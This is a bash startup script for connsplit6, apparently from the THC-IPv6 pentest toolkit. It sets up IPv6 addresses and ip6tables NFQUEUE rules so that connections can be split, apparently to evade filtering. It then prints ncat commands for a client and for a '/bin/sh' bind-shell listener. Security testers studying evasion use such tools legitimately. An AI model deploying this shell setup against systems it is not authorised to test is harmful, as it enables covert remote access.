#!/bin/bash
#
# connsplit6 startup script
#

test -z "$1" -o "$1" = "-h" -o -z "$2" && {
  echo "connsplit6 startup script (c) 2022 by van Hauser / THC"
  echo
  echo "Syntax: $0 interface client|server [ipv6-network]"
  echo "The ipv6-network (e.g. 2001:2:3:4::) needs to be supplied for client mode"
  echo
  exit 0
}

VAR=
while [ '!' -d "/proc/sys/net/ipv6/conf/$1" ]; do
  VAR="${VAR}$1 "
  shift;
done
INT=$1
M=$2
NET=$3
shift ; shift ; shift

PORTDEF=--dport
MODE=-1
test "$M" = "client" -o "$M" = "Client" -o "$M" = "CLIENT" -o "$M" = "c" -o "$M" = "C" && MODE=0
test "$M" = "server" -o "$M" = "Server" -o "$M" = "SERVER" -o "$M" = "s" -o "$M" = "S" && MODE=1
test "$MODE" = "-1" && { echo Error: you must specify either \"client\" or \"server\" as mode. ; exit 1 ; }
test "$MODE" = 0 && PORTDEF=--sport
test "$MODE" = 0 -a -z "$NET" && { echo Error: you must supply your global network for client mode ; exit 1; }
FROM=
TO=
echo "NET" | grep -E -q ":$" && {
  FROM=${NET}ff
  TO=${NET}ee
}
test -z "$FROM" && {
  FROM=`echo $NET | sed 's/:[0-9A-Fa-f]*$/:ff/'`
  TO=`echo $NET | sed 's/:[0-9A-Fa-f]*$/:ee/'`
}
test -n "$FROM" && {
  echo Configuring addresses $FROM and $TO on $INT
  {
    ip -6 addr add $FROM/64 dev $INT
    ip -6 addr add $TO/64 dev $INT
  } > /dev/null 2>&1
}

IPTABLES="`which ip6tables` -t mangle"
MODPROBE=`which modprobe`

# Check if the user can run iptables
$IPTABLES -L >/dev/null 2>&1
if [ "$?" != "0" ];
then
	echo "You need to be root to run this script"
	exit
fi

# Load ipt_NFQUEUE and ipt_state modules
$MODPROBE ipt_NFQUEUE
$MODPROBE ipt_state

# Ignore SIGINT, SIGKILL and SIGTERM
trap "echo User interrupt!" INT HUP KILL TERM

# Prepare for startup
# Create new tables
$IPTABLES -N THC_NFQUEUE2 >/dev/null 2>&1
# Send all hooked table traffic to new table
test "$MODE" = "0" && {
 $IPTABLES -I PREROUTING -j THC_NFQUEUE2 -p tcp $PORTDEF 64446 || {
  echo Error: your supplied ip6tables definitions are invalid, resetting
  $IPTABLES -X THC_NFQUEUE2 >/dev/null 2>&1
  exit 1
 }
}
test "$MODE" = "1" && {
 $IPTABLES -I POSTROUTING -j THC_NFQUEUE2 -p tcp $PORTDEF 64446 || {
  echo Error: your supplied ip6tables definitions are invalid, resetting
  $IPTABLES -X THC_NFQUEUE2 >/dev/null 2>&1
  exit 1
 }
}
# Send all traffic from the new table to NFQUEUE table
$IPTABLES -I THC_NFQUEUE2 -p all -j NFQUEUE
# Fix loopback traffic
$IPTABLES -I INPUT -p all -i lo -j ACCEPT
$IPTABLES -I OUTPUT -p all -o lo -j ACCEPT

# Help information
echo
echo
echo Now run:
test "$MODE" = 0 && echo "  ncat -6 -p 64446 -s $FROM TARGET SHELLPORT"
test "$MODE" = 1 && echo "  ncat -6 -p SHELLPORT -l -e /bin/sh"
echo

# Start connsplit6
connsplit6 -v $INT $M

# Drop fix for loopback traffic
$IPTABLES -D INPUT -p all -i lo -j ACCEPT
$IPTABLES -D OUTPUT -p all -o lo -j ACCEPT
# Delete incoming exceeded drop rule
$IPTABLES -D INPUT -p icmpv6 --icmpv6-type 3 -i $INT -j DROP
# Restore hooked table
$IPTABLES -D POSTROUTING -j THC_NFQUEUE2 $*
# Drop rules from nfq-test-1 tables
$IPTABLES -F THC_NFQUEUE2
# Delete the table
$IPTABLES -X THC_NFQUEUE2 >/dev/null 2>&1
if [ "$?" != "0" ]; then
	echo "Unable to drop THC_NFQUEUE2!"
	echo "You need to do this manually!"
fi	

echo
echo done.
